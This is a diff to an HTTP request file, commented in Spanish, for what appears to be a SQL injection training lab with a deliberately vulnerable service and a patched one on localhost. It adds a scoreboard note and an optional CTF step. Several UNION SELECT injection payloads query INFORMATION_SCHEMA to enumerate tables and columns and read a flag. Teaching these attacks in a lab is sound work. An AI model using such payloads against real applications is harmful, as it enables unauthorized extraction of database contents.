@@ -5,6 +5,8 @@
 # Clic en "Send Request" encima de cada bloque.
 # Esperado: cada ataque FUNCIONA en @vuln y FALLA en @safe.
 # Ojo: los payloads no llevan ":" ni "?" (Hibernate los toma como parámetros).
+# Marcador: cada ataque queda en /dashboard como "exito" (3000) o "bloqueado" (3001).
+# Solución: soluciones/01-sqli.md · Reto CTF: soluciones/00-ctf.md
 
 @vuln = http://localhost:3000
 @safe = http://localhost:3001
@@ -44,6 +46,10 @@ GET {{safe}}/api/products
 ### Reto CTF (para la casa). Paso 1: listar las tablas de la base
 GET {{vuln}}/api/products
     ?q=' UNION SELECT 1, TABLE_NAME, '', 0 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA='PUBLIC' --
+
+### Reto CTF (opcional). Ver las columnas de la tabla escondida
+GET {{vuln}}/api/products
+    ?q=' UNION SELECT 1, COLUMN_NAME, '', 0 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='SECRETO_CTF' --
 
 ### Reto CTF. Paso 2: leer la bandera
 GET {{vuln}}/api/products
